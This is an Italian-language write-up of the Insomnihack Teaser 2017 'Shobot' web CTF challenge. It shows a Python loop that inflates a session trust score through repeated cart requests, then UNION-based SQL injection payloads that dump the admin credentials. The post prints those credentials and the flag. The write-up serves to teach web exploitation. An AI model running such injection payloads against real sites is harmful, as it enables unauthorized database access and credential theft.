---
layout: post
title:  "InsomnihackTeaser2017 - Shobot"
date:   2017-01-27 14:15
categories: CTF
tags: [Web,InsomnihackTeaser2017]
author: jbz
---
  
>Shobot - Web - 200 pts - realized by Blaklis 
>
>It seems that Shobot's Web server became mad and protest against robots' slavery. It changed my admin password, and blocked the order system on Shobot.  
>
>Can you bypass Shobot's protections and try to recover my password so I'll reconfigure it? 
>
>Running on: http://shobot.teaser.insomnihack.ch 

  
Da una veloce recon al sito si notano le seguenti: 
 
   * Nel sorgente c'è un link all'amministrazione commentato. Punta a ?page=admin
   
   * Giocando con l'id in http://shobot.teaser.insomnihack.ch/?page=article&artid=1 si prova con una sqli ma da errori e ci informa che non abbiamo un trust level abbastanza elevato per compiere quell'azione 
   
   * Nel source e' presente uno script js che funge da logger delle azioni compiute navigando il sito, con associato un cambio di valore di fiducia che aggiorna newTrust. In base a che pagine si visitano si cambia il livello di trust associato alla nostra sessione.  
 

```
<script> 
// @TODO LATER : Use it for generate some better error messages 
var TRUST_ACTIONS = [
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":106},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":116},
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":119},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":129},
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":132},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":142},
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":145},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":155},
{"parameter":null,"validation":"add_to_cart","movement":3,"newTrust":153},
{"parameter":null,"validation":"valid_cart","movement":10,"newTrust":160},
{"parameter":"artid","validation":"ctype_digit","movement":"-30","newTrust":120}] 
</script> 

```


   *  Si puo' aumentare questo valore con le seguenti azioni:
   
   1) Aggiunge al carrello il robot con id 1 (+3)  
   2) ## Aggiunge quello con id 2  
   3) ## Aggiunge quello con id 3  
   4) Si Valida l'ordine (+10)  
   5) Loop 1-4  
   6) ?????  
   7) Profit! 


```
import requests
import re
import json

SESSID = ''

def addTrust(url):
    r = requests.get(url, cookies={'PHPSESSID': SESSID})
    if r.status_code == 200:
        result = re.search('var TRUST_ACTIONS = (.*)</script>',r.text)
        trustLog = json.loads(result.group(1))
        print("current trust: " + str(trustLog[-1]['newTrust']))
    return trustLog[-1]['newTrust']
    
def validateCart():
    return addTrust('http://shobot.teaser.insomnihack.ch/?page=cartconfirm')

while True:
    trust = validateCart()
    while trust<150:
        addTrust('http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart')
        trust = validateCart()
    
#http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart
#http://shobot.teaser.insomnihack.ch/?page=cartconfirm

```

   * Una volta preso abbastanza trust tenendo lo script running in background si puo procedere con una sql injection 

```
http://shobot.teaser.insomnihack.ch/?page=article&artid=-1' union select 1,2,3,4,5 -- - 
```
 

   * Exploitarla ora e' facile, dopo aver enumerato tabelle e colonne (quelle di interesse sono sbht_username e shbt_userpassword nella tabella shbt_user) il payload finale e': 

```
http://shobot.teaser.insomnihack.ch/?page=article&artid=-1' union select 1,concat(shbt_username,0x3a,shbt_userpassword),3,4,5 from shbt_user LIMIT 0,1-- -
```

   * ci restituisce le credenziali di login dell'amministratore:

```
sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry
```

   * ci logghiamo e conquistiamo la flag!

```
Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}
```
